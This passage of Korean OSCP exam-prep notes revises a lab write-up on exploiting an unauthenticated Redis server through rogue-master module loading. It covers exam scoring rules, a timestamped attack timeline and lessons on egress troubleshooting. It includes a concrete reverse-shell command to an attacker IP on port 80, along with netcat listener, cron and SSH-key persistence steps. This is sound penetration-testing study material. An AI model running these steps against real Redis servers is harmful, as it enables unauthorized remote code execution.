> - **Metasploit 대안(`exploit/linux/redis/redis_replication_cmd_exec`)은 일부러 쓰지 않음.** 시험에서 Metasploit 은 **1대 한정**임. 수동 PoC 로 충분한 박스에 그 카드를 쓰는 것은 낭비 — **아끼는 판단 자체가 시험 전략임**
> - **수동 대안을 손에 익힐 것.** 순수 `redis-cli` 절차(`slaveof` → `config set dbfilename` → `module load` → `system.exec`)가 스크립트가 막힐 때의 생명줄

**지우기 전 원문** (`Wombo.md` §7-1·2·3)

```
1. **`redis-rogue-server.py`는 허용된다.** 표준의 금지 정의는 "**스스로 취약점을 발견해** 자동 익스플로잇하는" 도구다. 이건 **단일 취약점(Redis 모듈 로드 RCE) PoC**라 발견 단계가 없다 — exploit-db/GitHub PoC와 같은 지위로 허용된다.
2. **Metasploit 대안을 일부러 쓰지 않았다.** `exploit/linux/redis/redis_replication_cmd_exec`가 같은 기법을 자동화하지만, 시험에서 **Metasploit은 1대에만** 쓸 수 있다. 수동 PoC로 충분한 이 박스에 그 카드를 쓰는 건 낭비 — **아꼈다.** 이 판단 자체가 시험 전략이다.
3. **수동 대안을 반드시 손에 익혀라.** 3-2의 순수 `redis-cli` 절차(`slaveof`→`config set dbfilename`→`module load`→`system.exec`)는 스크립트가 막힐 때의 생명줄이다.
```

---

## 11. C. 시험 관점 — 「비대화형 명령 실행으로 읽은 플래그는 0점」

**어느 절** — 기존에 웹셸/플래그 증거 절이 있으면 **병합**, 없으면 **신규**.

**넣을 본문**

> `system.exec`(Redis 모듈) · 웹셸 · 단발 명령 실행 — 전부 **비대화형**임. OSCP 는 *"this includes any type of web-based shell"* 로 이 형태로 얻은 플래그를 **0점** 처리함([[Butch]]).
>
> **시험이라면 리버스셸을 먼저 잡을 것:**
>
> ```bash
> redis-cli -h <타겟> system.rev <공격자IP> <포트>
> ```
>
> 그 안에서 `whoami; id; hostname; hostname -I; date; cat proof.txt` 를 **한 명령으로 묶어** 한 화면에 담을 것.
>
> ⚠️ [[Wombo]] 는 이 단계를 **실행하지 않았음** — 남은 증거가 `id_output.txt`(id·whoami·hostname·uname)와 `flags.txt`(값)로 분리돼 있고 둘 다 `system.exec` 산출임. 시험이었으면 0점 상태로 끝났음.
>
> ⚠️ 리버스셸도 egress 제약을 그대로 받음 — [[Wombo]] 에서 성공한 회선은 tcp/80 하나뿐이었음(「connect-back 이 어느 포트로도 안 잡힌다」 항목).

**지우기 전 원문** (`Wombo.md` §3-2 `[!warning]` · §7-4)

```
> [!warning] `system.exec`는 대화형 셸이 아니다 — 시험이라면 리버스셸을 잡아라
> `system.exec`로 읽은 플래그는 **웹셸로 읽은 플래그와 같은 지위**다 — 비대화형 명령 실행이다. **OSCP는 웹셸로 얻은 플래그를 0점 처리**한다([[Butch]] 참조). 시험이라면 `system.rev`로 리버스셸을 먼저 잡고 그 안에서 `whoami; hostname; ip a; cat proof.txt`를 **한 화면에** 담아야 한다:
> ```bash
> redis-cli -h 192.168.248.69 system.rev 192.168.45.207 80
> ```
> ⚠️ 이 리버스셸도 **:80으로만** 붙는다. `nc -lvnp 80`으로 받아야 하고, 다른 포트는 egress에 막힌다. 이 박스에서 :80은 익스플로잇 전달 채널이자 리버스셸 채널로 이중 역할을 한다.
```

```
4. **플래그 증거는 대화형 셸에서.** `system.exec`는 비대화형이라 그것으로 읽은 플래그는 **웹셸 취급 = 0점**([[Butch]]). 시험이라면 `system.rev`로 리버스셸을 잡아 `whoami; hostname; ip a; cat proof.txt`를 한 화면에.
```

⚠️ **강등한 것** — 원문의 「이 리버스셸도 :80으로만 붙는다 … 다른 포트는 egress에 막힌다」는 단정임. 위 본문은 「성공한 회선이 tcp/80 하나」로 낮췄음(근거: 1번 항목의 `[가정]` 판정).

---

## 12. C·E. 시험 관점 — 「시간 배분 · 순서」

**어느 절** — 기존에 시간 배분/손절 절이 있으면 **병합**, 없으면 **신규**.

**넣을 본문**

> **connect-back 이 여러 포트에서 안 잡히면, 대체 경로를 파기 «전에» egress 부터 확정할 것.**
>
> [[Wombo]] 실측 타임라인(`~/PG/Wombo/` 파일 mtime, 2026-08-20):
>
> | 시각 | 사건 |
> |---|---|
> | 11:25:28 | nmap 시작 |
> | 11:25:38 | `redis_recon.txt` — 무인증 Redis 확정 |
> | 11:27:28 | 첫 rogue master :80 → `errno 98`(로컬 bind) |
> | 11:30:10 | `run_rrs.sh` — :443 재시도 |
> | 11:35:40 | SSH 키쌍 생성(authorized_keys 경로 준비) |
> | 11:36 · 11:39 | cron.d 심기 2회 — 실패 |
> | 11:50:12 | `/root/.ssh` 부재 확인 — **키쌍 생성 15분 «뒤»** |
> | 12:02:31 | `flags.txt` — 플래그 회수 |
>
> **정찰 종료(11:25:38)부터 플래그(12:02:31)까지 36분 53초.** 그중 대체 경로(cron·SSH 키) 탐색이 11:30~11:51 의 **약 21분**이고, 그 진입 자체가 `errno 98` 오독에서 나옴.
>
> **순서 규율 둘:**
> 1. 대체 경로를 파기 전에 **egress 를 확정**할 것
> 2. 페이로드를 준비하기 전에 **경로 가용성부터 한 줄로 판정**할 것 — `config set dir /root/.ssh` 를 먼저 쳤으면 SSH 키 생성과 cron 시도 일부가 통째로 불필요했음

**지우기 전 원문** (`Wombo.md` §7-7 · §6 도입 `[!abstract]`)

```
7. **시간 배분** — 익스플로잇 5분, egress 진단에 나머지. 만약 시험이라면 "connect-back이 여러 포트에서 안 온다"를 관측한 시점에 **즉시 포트 스윕(tcpdump + 여러 리스너)**으로 전환했어야 헤매지 않았다. cron/authorized_keys 대체 경로를 파기 전에 egress부터 확정하는 게 순서였다.
```

```
> [!abstract] 익스플로잇은 5분, 나머지는 egress와의 싸움이었다
> 모듈 로드 RCE 자체는 알려진 기법이라 빨랐다. 시간을 태운 건 **connect-back이 안 잡히는 원인을 계층별로 분리하지 못한 것**이었다. 아래 다섯 개는 전부 "왜 안 됐는지"의 근거와 함께 기록한다 — 다음 Redis/egress 박스에서 이 목록이 시간을 아낀다.
```

⚠️ **반증한 것** — 원문의 「익스플로잇 5분」은 **파일 mtime 과 맞지 않음.** 첫 익스플로잇 시도(11:27:28)부터 플래그(12:02:31)까지 35분이고, 성공 로그(`verify_run.log` 12:06:25)까지는 41분임. 위 본문은 mtime 기반 타임라인으로 대체했음. 또 원문은 「아래 다섯 개」라고 썼으나 §6 의 항목은 **여섯 개**(①~⑥)임 — 내부 모순.
